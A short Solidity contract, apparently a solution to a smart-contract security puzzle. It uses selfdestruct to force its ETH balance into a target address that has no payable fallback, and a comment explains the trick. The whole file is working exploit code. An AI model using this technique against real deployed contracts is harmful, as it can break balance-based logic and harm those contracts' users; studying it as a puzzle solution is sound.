// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @dev If you want to force a contract to receive eth without fallbacks fct
/// you can self destruct another contract and it will send all the balance to
/// the address even if this address doesn't accept payment
contract HackForce {
    address public force;

    constructor(address _force) payable {
        force = _force;
    }

    function selfDestructBoom() external payable {
        address payable addr = payable(address(force));
        selfdestruct(addr);
    }
}